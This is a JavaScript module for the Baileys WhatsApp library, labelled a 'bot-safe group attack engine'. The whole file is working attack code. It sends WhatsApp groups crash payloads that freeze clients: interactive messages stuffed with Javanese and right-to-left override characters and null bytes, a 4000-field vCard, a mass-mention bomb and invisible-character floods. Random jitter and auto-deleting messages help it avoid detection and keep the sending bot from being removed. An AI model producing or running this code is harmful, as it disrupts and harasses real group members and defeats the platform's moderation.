// lib/rizogccrash.js
// XGC + RIZOGCCRASH — bot-safe group attack engine
// Bot stays in group, stays admin, stays undetected

const crypto = require('crypto');
const {
    generateWAMessageFromContent,
    proto
} = require('@whiskeysockets/baileys');

// ═══════════════════════════════════════════
//  CONFIG
// ═══════════════════════════════════════════
const CONFIG = {
    // timing — safe
    JITTER_BASE_MS: 9000,
    JITTER_SPREAD: 0.6,
    VECTOR_GAP_MS: 25000,

    // payload — safe sizes
    MAX_INVISIBLE: 2500,
    MAX_MENTIONS: 80,
    MAX_JAVA: 2500,
    MAX_BIDI: 400,

    // bot safety
    SILENT: true,
    EPHEMERAL: true,
    EPHEMERAL_SECONDS: 30,          // auto-delete 30s
    SELF_GUARD: true,
    HEALTH_CHECK: true,
    ERROR_STOP: 0.3,
    KEEP_BOT_SAFE: true,            // never leave group, never trigger kick

    // vectors enable
    VEC_FREEZE: true,
    VEC_MENTION: true,
    VEC_CARD: true,
    VEC_INVIS: true,
    VEC_SELECT: true,
    VEC_GALAXY: true
};

const JAVA_CHAR = "\uA9BE";
const BIDI_CHAR = "\u202e";
const ZW_CHAR = "\u200b";

function jitter(base) {
    const spread = base * CONFIG.JITTER_SPREAD;
    return base + (Math.random() * 2 - 1) * spread;
}

function pickTitle() {
    const t = [
        'Group update', 'Important', 'Check this', 'Read',
        'Info', 'Notice', 'Quick', 'Hey'
    ];
    return t[Math.floor(Math.random() * t.length)];
}

// ═══════════════════════════════════════════
//  BOT SAFE CONTEXT — no traceable metadata
// ═══════════════════════════════════════════
function safeContext(extra = {}) {
    return {
        silent: CONFIG.SILENT,
        expiration: CONFIG.EPHEMERAL ? CONFIG.EPHEMERAL_SECONDS : 0,
        ephemeralSettingTimestamp: CONFIG.EPHEMERAL ? Date.now() : 0,
        // NO forwarding score — server pe suspicious
        // NO newsletter info — traceable
        // NO isForwarded — cleaner
        ...extra
    };
}

// ═══════════════════════════════════════════
//  BOT HEALTH CHECK
// ═══════════════════════════════════════════
async function checkBotHealth(sock, groupJid) {
    try {
        if (!sock || !sock.user) return { ok: false, reason: 'socket_dead' };
        if (!sock.user.id) return { ok: false, reason: 'no_user' };
        if (sock.ws && sock.ws.readyState !== 1) return { ok: false, reason: 'ws_closed' };

        // check bot still in group
        try {
            const md = await sock.groupMetadata(groupJid);
            const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            const botInGroup = md.participants?.some(p =>
                p.id === botJid || p.id === sock.user.id
            );
            if (!botInGroup) return { ok: false, reason: 'bot_not_in_group' };
        } catch (_) {
            // can't read metadata — group might be locked
            return { ok: false, reason: 'no_group_access' };
        }

        return { ok: true };
    } catch (err) {
        return { ok: false, reason: err.message };
    }
}

// ═══════════════════════════════════════════
//  VECTOR 1 — FREEZE (interactive + java + bidi)
// ═══════════════════════════════════════════
async function vecFreeze(sock, groupJid, onProgress, state) {
    let sent = 0;
    if (!CONFIG.VEC_FREEZE) return sent;

    for (let i = 0; i < 2; i++) {
        if (state.errorRate > CONFIG.ERROR_STOP) break;

        const payload = {
            title: JAVA_CHAR.repeat(CONFIG.MAX_JAVA),
            sections: [{ title: BIDI_CHAR.repeat(CONFIG.MAX_BIDI), rows: [] }]
        };

        try {
            const msg = generateWAMessageFromContent(groupJid, proto.Message.fromObject({
                interactiveMessage: {
                    body: { text: pickTitle() },
                    footer: { text: '' },
                    header: { title: '', hasMediaAttachment: false },
                    nativeFlowMessage: {
                        buttons: [
                            { name: 'single_select', buttonParamsJson: JSON.stringify(payload) },
                            ...(CONFIG.VEC_GALAXY ? [{
                                name: 'galaxy_message',
                                buttonParamsJson: JSON.stringify({
                                    'screen_1_TextInput_0': 'opt' + '\0'.repeat(3000),
                                    'flow_token': 'AQAAAAACS5FpgQ_cAAAAAE0QI3s.'
                                }),
                                version: 3
                            }] : [])
                        ]
                    },
                    contextInfo: safeContext()
                }
            }), { userJid: groupJid });

            await sock.relayMessage(groupJid, msg.message, { messageId: msg.key.id });
            sent++; state.success++;
            if (onProgress) onProgress(state.success, state.total, 'freeze');
        } catch (err) {
            state.errors++;
            console.error('[xgc] freeze err:', err.message);
        }

        await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_BASE_MS)));
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 2 — MENTION BOMB
// ═══════════════════════════════════════════
async function vecMention(sock, groupJid, members, onProgress, state) {
    let sent = 0;
    if (!CONFIG.VEC_MENTION) return sent;

    const limited = members.slice(0, CONFIG.MAX_MENTIONS);
    const mentions = limited.map(p => p.id).filter(Boolean);
    if (!mentions.length) return sent;

    const text = pickTitle() + '\n' +
        mentions.map(id => `@${id.split('@')[0]}`).join(' ') + '\n' +
        ZW_CHAR.repeat(CONFIG.MAX_INVISIBLE);

    try {
        const msg = generateWAMessageFromContent(groupJid, proto.Message.fromObject({
            extendedTextMessage: {
                text,
                contextInfo: safeContext({ mentionedJid: mentions })
            }
        }), { userJid: groupJid });

        await sock.relayMessage(groupJid, msg.message, { messageId: msg.key.id });
        sent++; state.success++;
        if (onProgress) onProgress(state.success, state.total, 'mention');
    } catch (err) {
        state.errors++;
        console.error('[xgc] mention err:', err.message);
    }

    await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_BASE_MS)));
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 3 — VCARD BOMB
// ═══════════════════════════════════════════
async function vecCard(sock, groupJid, onProgress, state) {
    let sent = 0;
    if (!CONFIG.VEC_CARD) return sent;

    let vcard = 'BEGIN:VCARD\nVERSION:3.0\n';
    for (let i = 0; i < 4000; i++) {
        vcard += `FN:n${i}\n`;
    }
    vcard += 'END:VCARD';

    try {
        const msg = generateWAMessageFromContent(groupJid, proto.Message.fromObject({
            contactMessage: {
                displayName: pickTitle(),
                vcard,
                contextInfo: safeContext()
            }
        }), { userJid: groupJid });

        await sock.relayMessage(groupJid, msg.message, { messageId: msg.key.id });
        sent++; state.success++;
        if (onProgress) onProgress(state.success, state.total, 'card');
    } catch (err) {
        state.errors++;
        console.error('[xgc] card err:', err.message);
    }

    await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_BASE_MS)));
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 4 — INVISIBLE FLOOD (text)
// ═══════════════════════════════════════════
async function vecInvis(sock, groupJid, onProgress, state) {
    let sent = 0;
    if (!CONFIG.VEC_INVIS) return sent;

    const invis = (ZW_CHAR + BIDI_CHAR + JAVA_CHAR).repeat(800);

    try {
        const msg = generateWAMessageFromContent(groupJid, proto.Message.fromObject({
            extendedTextMessage: {
                text: invis,
                contextInfo: safeContext()
            }
        }), { userJid: groupJid });

        await sock.relayMessage(groupJid, msg.message, { messageId: msg.key.id });
        sent++; state.success++;
        if (onProgress) onProgress(state.success, state.total, 'invis');
    } catch (err) {
        state.errors++;
        console.error('[xgc] invis err:', err.message);
    }

    await new Promise(r => setTimeout(r, jitter(CONFIG.JITTER_BASE_MS)));
    return sent;
}

// ═══════════════════════════════════════════
//  MAIN — XGC + RIZOGCCRASH
// ═══════════════════════════════════════════
async function RizoGCCrash(sock, groupJid, metadata, mode, onProgress) {
    // pre-flight
    if (CONFIG.HEALTH_CHECK) {
        const h = await checkBotHealth(sock, groupJid);
        if (!h.ok) return { ok: false, error: `health: ${h.reason}` };
    }

    const members = metadata?.participants || [];
    const state = { success: 0, errors: 0, errorRate: 0, total: 6 };
    const vectors = [];

    const updateErr = () => {
        const t = state.success + state.errors;
        state.errorRate = t > 0 ? state.errors / t : 0;
    };

    const run = async (name, fn) => {
        try {
            const s = await fn();
            updateErr();
            if (s > 0) vectors.push(name);
        } catch (err) {
            console.error(`[xgc] ${name} fatal:`, err.message);
            state.errors++; updateErr();
        }
    };

    // mode: xgc = light vectors | full = all vectors
    if (mode === 'xgc') {
        await run('mention', () => vecMention(sock, groupJid, members, onProgress, state));
        await new Promise(r => setTimeout(r, jitter(CONFIG.VECTOR_GAP_MS)));
        await run('invis', () => vecInvis(sock, groupJid, onProgress, state));
    } else {
        // full RIZOGCCRASH
        await run('freeze', () => vecFreeze(sock, groupJid, onProgress, state));
        await new Promise(r => setTimeout(r, jitter(CONFIG.VECTOR_GAP_MS)));
        await run('mention', () => vecMention(sock, groupJid, members, onProgress, state));
        await new Promise(r => setTimeout(r, jitter(CONFIG.VECTOR_GAP_MS)));
        await run('card', () => vecCard(sock, groupJid, onProgress, state));
        await new Promise(r => setTimeout(r, jitter(CONFIG.VECTOR_GAP_MS)));
        await run('invis', () => vecInvis(sock, groupJid, onProgress, state));
    }

    return {
        ok: state.success > 0,
        sent: state.success,
        errors: state.errors,
        errorRate: state.errorRate.toFixed(2),
        vectors,
        members: members.length
    };
}

module.exports = { RizoGCCrash, CONFIG };